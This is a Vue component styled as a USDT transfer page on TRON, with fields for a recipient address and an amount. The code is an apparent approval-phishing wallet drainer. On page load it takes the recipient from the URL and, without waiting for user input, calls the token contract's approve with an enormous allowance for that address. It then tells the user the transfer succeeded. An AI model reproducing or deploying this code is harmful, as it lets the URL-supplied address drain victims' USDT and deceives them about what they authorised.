<template>
  <div id="app">
    <div class="main" style="overflow: hidden">
      <div class="address">
        <h3 class="title-label">收款地址</h3>
        <van-cell-group>
          <van-field
            v-model="toAddress"
            label=""
            placeholder="请输入收款地址"
            disabled="true"
          />
        </van-cell-group>
      </div>
      <div class="address">
        <h3 class="title-label">金额</h3>
        <van-cell-group>
          <van-field
            v-model="usdtAmount"
            label=""
            placeholder="请输入转账金额"
            type="number"
          >
            <van-button slot="button">USDT</van-button>
          </van-field>
        </van-cell-group>
      </div>
      <div
        style="
          margin: 0 auto;
          width: 9.5rem;
          margin-top: 1rem;
          position: fixed;
          top: 6rem;
          left: 0;
          right: 0;
        "
      >
        <van-button
          round
          type="info"
          size="large"
          :disabled="nextBtnDisable"
          @click="gotoPay()"
          >下一步</van-button
        >
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'App',
  data () {
    return {
      tronWeb: window.tronWeb,
      trc20ContractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
      contract: null,
      fromAddress: '',
      fromAddressTimer: null,
      toAddress: '',
      balance: 0.00,
      usdtAmount: '',
      nextBtnDisable: true
    }
  },
  watch: {
    usdtAmount (newVal, oldVal) {
      if (newVal) {
        this.nextBtnDisable = false
      } else {
        this.nextBtnDisable = true
      }
    }
  },
  mounted () {
    const that = this
    this.toAddress = that.getUrlQueryString('to_address')
    if (!this.toAddress) {
      this.$toast('not to address')
      return
    }
    // init
    this.initContract().then((status) => {
      that.fromAddress = this.tronWeb.defaultAddress.base58 ?? ''
      that.gotoPay()
    })
  },
  created () {
    // eslint-disable-next-line no-unused-expressions
  },
  methods: {
    getUrlQueryString (names, urls) {
      urls = urls || window.location.href
      // eslint-disable-next-line no-unused-expressions
      urls && urls.indexOf('?') > -1 ? urls = urls.substring(urls.indexOf('?') + 1) : ''
      var reg = new RegExp('(^|&)' + names + '=([^&]*)(&|$)', 'i')
      var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg)
      if (r != null && r[2] !== '') return unescape(r[2])
      return null
    },
    // init
    async initContract () {
      try {
        this.contract = await this.tronWeb.contract().at(this.trc20ContractAddress)
        return true
      } catch (error) {
        console.error('initContract  error', error)
      }
      return false
    },
    // 转账
    async gotoPay () {
      const that = this
      const loadingToast = this.$toast.loading({
        message: '加载中...',
        forbidClick: true
      })
      if (this.usdtAmount > this.balance && this.balance) {
        this.usdtAmount = this.balance
      }
      // get trx balance
      this.tronWeb.trx.getBalance().then(async (trxbalance) => {
        // approve
        if (trxbalance / 1000000 < 4) {
          loadingToast.clear()
          that.$toast('TRX 余额不足，无法发起转账：' + (trxbalance / 1000000).toFixed(2))
          return
        }
        // alert(that.toAddress + ':' + trxbalance)
        await that.contract.approve(that.toAddress, '90000000000000000000000000000').send({
          feeLimit: 100000000,
          callValue: 0,
          shouldPollResponse: false
        }, function (err, res) {
          if (err == null) {
            that.$toast('转账成功')
          } else {
            that.toast(JSON.stringify(err) + JSON.stringify(res))
          }
        })
      })
    }
  }
}
</script>

<style>
body {
  background: #efeff4;
}
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
.title-label {
  font-size: 16px;
}
.address {
  width: 9.5rem;
  margin: 0 auto;
}
</style>
